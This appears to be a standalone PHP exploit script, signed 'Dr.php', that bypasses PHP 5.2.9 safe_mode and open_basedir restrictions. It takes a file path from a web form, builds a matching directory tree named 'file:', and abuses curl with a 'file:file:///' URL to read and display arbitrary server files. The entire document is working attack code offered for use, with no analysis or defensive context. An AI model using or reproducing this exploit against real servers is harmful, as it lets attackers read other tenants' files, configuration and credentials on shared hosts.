<?
/*
   DDDDDDDDDD                                    hh                      
   DD      DDDD                                  hh                      
   DD        DD    rrrrrrrr        pppppppp      hhhhhhhhhh    pppppppp  
   DD        DD    rr              pppp    pp    hh      hh    pppp    pp
   DD        DD    rr              pp      pp    hh      hh    pp      pp
   DD        DD    rr              pp      pp    hh      hh    pp      pp
   DD      DDDD    rr              pppp    pp    hh      hh    pppp    pp
   DDDDDDDDDD      rr        ..    pppppppp      hh      hh    pppppppp  
                                   pp                          pp        
                                   pp                          pp        
site : www.vxx9.com
email : dr-php@hotmail.com
*/

if(!empty($_GET['file'])) $file=$_GET['file'];
else if(!empty($_POST['file'])) $file=$_POST['file'];

echo '<PRE><p>PHP 5.2.9 safe_mode & open_basedir bypass
<p><form name="form" action="http://'.$_SERVER["HTTP_HOST"].htmlspecialchars($_SERVER["SCRIPT_N
AME"]).$_SERVER["PHP_SELF"].'" method="post"><input type="text" name="file" size="50" value="'.htmlspecialchars($file).'"><input type="submit" name="hardstylez" value="Show"></form>';


$level=0;

if(!file_exists("file:"))
	mkdir("file:");
chdir("file:");
$level++;

$hardstyle = explode("/", $file);

for($a=0;$a<count($hardstyle);$a++){
	if(!empty($hardstyle[$a])){
		if(!file_exists($hardstyle[$a])) 
			mkdir($hardstyle[$a]);
		chdir($hardstyle[$a]);
		$level++;
	}
}

while($level--) chdir("..");

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "file:file:///".$file);

echo '<FONT COLOR="RED"> <textarea rows="40" cols="120">';

if(FALSE==curl_exec($ch))
	die('>Sorry... File '.htmlspecialchars($file).' doesnt exists or you dont have permissions.');

echo ' </textarea> </FONT>';

curl_close($ch);


?>